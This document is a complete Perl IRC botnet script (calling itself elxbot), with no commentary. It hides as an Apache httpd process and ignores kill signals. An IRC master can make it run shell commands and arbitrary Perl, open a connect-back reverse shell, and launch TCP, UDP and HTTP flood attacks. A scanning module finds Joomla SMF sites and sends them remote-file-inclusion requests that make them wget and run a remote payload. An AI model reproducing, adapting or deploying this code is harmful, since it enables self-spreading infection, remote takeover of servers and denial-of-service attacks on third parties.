#!/usr/bin/perl

use IO::Socket;
srand;
my $bPs        = '/usr/local/apache/bin/httpd -DSSL';
#my $aMaster    = 'cesik';
my $aHost      = 'zuo@pentagon.gov';
my $sServer    = 'someshit.ru';
my $sPort      = '6667';
my $sTimeOut   = '300';
my $bChan      = '#wtfu';

my $bNickLen   = '7';
chomp (my $bNick   = `whoami`);
my $bIrcName   = 'smf';
chomp (my $bRealName  = `uname -a`);
my $bDelay     = '2';

open(LOCK, '>/tmp/asKRwID26W') or die;
unless(flock(LOCK, 4 | 2)) { die; }

if(fork) { exit; }
$0 = $bPs;

$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';

package irc;
use IO::Select;

our $irc_socket;
our $irc_select = new IO::Select;

my $cur_nick;

sub raw { print $irc_socket "$_[0]\n"; }

sub mnick {
    my $nick = $_[1];
    my @abc = ('a' .. 'z');
    for(my $i=0;$i<$_[0];$i++) { $nick .= $abc[int(rand($#abc))]; }
    return $nick;
}

sub init {
    
    my $socket = IO::Socket::INET->new(PeerAddr => $_[3],
                                       PeerPort => $_[4],
                                       Proto    => 'tcp',
                                       Timeout  => '5') or return 0;
    if(defined($socket)) {
        $irc_socket = $socket;
        $irc_select->add($irc_socket);
        $irc_socket->autoflush(1);
        raw("USER ".$_[1]." 0 0 ".$_[2]);
        $cur_nick = $_[0];
        raw("NICK $cur_nick");
        return 1;
    }
    return 0;
}

sub loop {
    my $time_out = time;
    
    for(;;) {
        my @handles = $irc_select->can_read(1);
        
        if((time - $time_out) > $sTimeOut) { $irc_select->remove($irc_socket); $irc_socket->close(); last; }
        
        next unless(@handles);
        
        foreach my $handle (@handles) {
            my $datain;$handle->recv($datain, 1023, 0);
            my @lines = split(/\r\n/, $datain);
            
            foreach my $line (@lines) {
                if($line =~ m/^PING (:.+)/) { $time_out = time; raw("PONG $1"); next; }
                elsif($line =~ m/^\:.*\s+005\s+\.*/i) { raw("JOIN $bChan"); next; }
                elsif ($line =~ m/^\:.*\s+433\s+\.*/i) { $cur_nick = mnick($bNickLen, $bNick); raw("NICK ".$cur_nick); next; }
                run::bcmd("$line");
            }
        }
    }
}
package run;
use Socket;

sub bcmd {
    my @line = split(/ /, $_[0]);
    
    my $RawMask = shift(@line); $RawMask =~ s/://;my ($Nick, $Mask) = $RawMask =~ /(.+)!(.+)/;
    #unless($Nick eq $aMaster) { return; }
    unless($Mask eq $aHost)   { return; }
    
    my $Type = shift(@line);
    unless($Type eq "PRIVMSG") { return; }
    
    my $To = shift(@line);
    
    $" = ' '; $line[0] =~ s/://;my $Text = "@line";
    
    if ($Text =~ /^(\Q$cur_nick\E\s+\.|\.)(.+)/) {
        if($2 =~ /^nick\s*(.*)/) {
            if($1) { $cur_nick = $1; }
            else { $cur_nick = irc::mnick($bNickLen, $bNick); }
            irc::raw("NICK $cur_nick");
            return;
        }
        
        if($2 =~ /^bye/) { irc::raw('QUIT :;'); exit; }
        
        
        
        return;
    }
    
    if ($Text =~ /^(\Q$cur_nick\E\s+\!|\!)(.+)/) {
        
        if(!fork) {

	    if ($2 =~ /^eval\s+(.+)/) { eval "$1"; return; }            

            if ($2 =~ /^rsh\s+(.+)\s+(\d+)/) { rsh($To, $1, $2); exit; }
            
            if ($2 =~ /^google\s+(\d+)\s+(.+)/) { spread::start($To, $1, $2); exit; }
            
            if ($2 =~ /^tcpflood\s+(.+)\s+(\d+)\s+(\d+)/) { flood::tcp($To, $1, $2, $3); exit; }
            
            if ($2 =~ /^udpflood\s+(.+)\s+(\d+)\s+(\d+)/) { flood::udp($To, $1, $2, $3); exit; }
            
            if ($2 =~ /^httpflood\s+(.+)\s+(\d+)/) { flood::http($To, $1, $2); exit; }
            if ($2 =~ /^join (.*)/) {
	    	j("$1");
	    }
	    if ($2 =~ /^part (.*)/) { 
	    	p("$1");
	    }
	    
            exit;
        }
        return;
    }
    
    if($Text =~ /^(\Q$cur_nick\E|\$sh)\s+(.+)/) { if(!fork) { bsh($To, $2); exit; } return; }
    if ($To eq $cur_nick) { if(!fork) { bsh($Nick, $Text); exit; } return; }
}

sub bsh {
    my $to = $_[0];
    my $cmd = $_[1];
    
    if($cmd =~ /cd (.+)/) { chdir("$1") or irc::raw("PRIVMSG $to :No such file or directory"); return; }
    
    my @sh_out = split(/\n/, `$cmd 2>&1 3>&1`);
    foreach my $line (@sh_out) { if($line) { irc::raw("PRIVMSG $to :$line"); sleep $bDelay; } }   
}

sub j { &join(@_); }
sub join {
	return unless $#_ == 0;
		irc::raw("JOIN $_[0]");
}

sub p { part(@_); }
sub part {
	irc::raw("PART $_[0]");
}

sub rsh {
    irc::raw("PRIVMSG $_[0] :\002[RSH]\002 Sending...");
    
    socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or exit;
    connect(SOCKET, sockaddr_in($_[2], inet_aton($_[1]))) or exit;
        
    open(STDIN, ">&SOCKET");
    open(STDOUT, ">&SOCKET");
    open(STDERR, ">&SOCKET");
        
    print "elxbot's connectback backdoor\n";
    system('/bin/sh');
        
    close(STDIN);
    close(STDOUT);
    close(STDERR);    
}

package spread;

sub start {
    irc::raw("PRIVMSG $_[0] :\002[GOOGLE]\002 Scanning for ".$_[1]."''.");
    
    our $s_time = time;
    my $m_time = $_[1] * 60; #''
    srand;
    
    my $bPath = '/tmp/sess_s5ce2e2b8w2e3wcswx31x1wwo53d451';
    my $rfi   = 'http://cia.gov/ap.txt';
    my $bLoc = 'http://cia.gov/fuck.txt';
    my $cmds  = "wget $BLoc -O $bPath; perl $bPath; rm -f $bPath";
    
    $cmds =~ s/ /%20/g;
    
    while($m_time > (time - $s_time)) {
        my $dup = "";my @urls = google();
        
        foreach my $url (@urls) {
            (my $host, my $tmp_path) = $url =~ /([\w\.\-\w]*)(\/\w*\/?)/;
            my $path = '/'; if($tmp_path =~ /(^\/\w+\/\w+\/$|^\/\w+\/$|^\/$)/) { $path = "$1"; }
            
            if($dup eq $host) { next; } $dup = "$host";
            
            $url = 'http://' . $path . '/components/com_smf/smf.php?mosConfig_absolute_path=' . $rfi . '?';
            
            my $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => $host, PeerPort => 80) or next;
            print $sock "GET $url HTTP/1.1\nHost: $host\nAccept: */*\nConnection: close\n\n";
            $sock->close();
        }
    }
    irc::raw("PRIVMSG $_[0] :\002[GOOGLE]\002 Scan finished.");
}

sub google() {
    
    my $rnd=(int(rand(300)));
    my $n= 80;
    if ($rnd<300) { $rnd=(int(rand(300))); }
    my $msn= (int(rand(10)) * $n);

    my @domains = ('ac', 'ad', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
                   'aq', 'ar', 'ar', 'as', 'at', 'au', 'aw', 'aw', 'az', 'ba', 'bb',
                   'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo',
                   'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd', 'cd',
                   'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop',
                   'cr', 'cs', 'cu', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'dz',
                   'ec', 'edu', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi', 'fi',
                   'fk', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi',
                   'gl', 'gn', 'gob', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu',
                   'gub', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie',
                   'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it',
                   'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp',
                   'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls',
                   'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'mg', 'mh', 'mk',
                   'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'museum',
                   'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net',
                   'nf', 'ng', 'ni', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om',
                   'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr',
                   'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'rj', 'ro', 'ru', 'rw',
                   'sa', 'sb', 'sc', 'sd', 'se', 'se', 'sg', 'sh', 'sj', 'sk', 'sl',
                   'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td',
                   'tf', 'tg', 'th', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw',
                   'tz', 'ua', 'ug', 'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 'vc',
                   've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xxx', 'ye', 'yt', 'yu',
                   'za', 'zm', 'zw');
    
    my @str = ();
    foreach my $dom (@domains) { push (@str,"%22Powered+by+SMF%22+%2Bcom_smf+site%3A".$dom."%20"); }
    
    my $query = 'http://www.altavista.com/web/results?q=';
    $query   .= $str[(rand(scalar(@str)))];
    $query   .= "&stq=$msn";
    
    my @lst=();
    #irc::raw("privmsg #debug :DEBUG only test googling: ".$query.""); 
    my $page = http_query($query);
    
    while ($page =~  m/<a class=l href=\"?http:\/\/([^>\"]+)\"?>/g){
        if ($1 !~ m/google|cache|translate/) { push (@lst,$1); }
    }
    return (@lst);
}

sub http_query {
    
    my $url = $_[0];
    my $host=$url;
    my $query=$url;
    my $page='';
    
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([\w\.\-\w]*)\/.*/$1/;
    $query =~ s/$host//;
    
    if ($query eq '') {$query='/';};
    eval {
	    local $SIG{ALRM} = sub { die "1";};
	    alarm 5;
	    my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
	    print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8) Gecko/20051111 Firefox/1.6\r\n\r\n";
	    my @r = <$sock>;
	    $page="@r";
	    alarm 0;
	    close($sock);
    };
    return $page;
}

package flood;
use POSIX;
use Socket;

our $s_time;

sub tcp {
    irc::raw("PRIVMSG $_[0] :\002[TCP-DDOS]\002 Attacking ".$_[1].":".$_[2]." for ".$_[3]."'.");
    
    $s_time = time;
    my @SOCKET;
    
    while ($_[3] > (time - $s_time)) {
        
        for(my $i=0;$i<200;$i++) {
            socket($SOCKET[$i], PF_INET, SOCK_STREAM, getprotobyname('tcp'));
            fcntl($SOCKET[$i], F_SETFL(), O_NONBLOCK());
        }
        
        for(my $i=0;$i<200;$i++) {
            connect($SOCKET[$i], sockaddr_in(!$_[2]?int(rand(65500)+1):$_[2], inet_aton($_[1])));
        }
        
        for(my $i=0;$i<200;$i++) {
            close($SOCKET[$i]);
        }
    }
    
    irc::raw("PRIVMSG $_[0] :\002[TCP-DDOS]\002 Finished.");
}

sub udp {
    irc::raw("PRIVMSG $_[0] :\002[UDP-DDOS]\002 Attacking ".$_[1].":".$_[2]." for ".$_[3]."'.");
    
    $s_time = time; 
    my $socket;
    my $packets = 0;
    socket($socket, PF_INET, SOCK_DGRAM, 17);
    
    while($_[3] > (time - $s_time)) {
        send($socket, 0, 0, sockaddr_in(!$_[2]?int(rand(65500)+1):$_[2], inet_aton($_[1])));
        $packets++;
    }
    close($socket);
    
    irc::raw("PRIVMSG $_[0] :\002[UDP-DDOS]\002 Sent ".$packets." packets.");
}

sub http {
    irc::raw("PRIVMSG $_[0] :\002[HTTP-DDOS]\002 Attacking ".$_[1].":80 for ".$_[2]."'.");
    
    $s_time = time;
    my $querys = 0;
    
    while ($_[2] > (time - $s_time)) {
        my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$_[1], PeerPort=>80);
        print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
        close($socket);
        $querys++;
    }
    
    irc::raw("PRIVMSG $_[0] :\002[HTTP-DDOS]\002 Sent ".$querys." querys.");
}

while(1) {
    if(irc::init(irc::mnick($bNickLen, $bNick), $bIrcName, $bRealName, $sServer, $sPort))
    {
        irc::loop();
    }
    sleep 10;
}
#
#
#
#
#GET IS A SHITTY FUCKING PROGRAM!
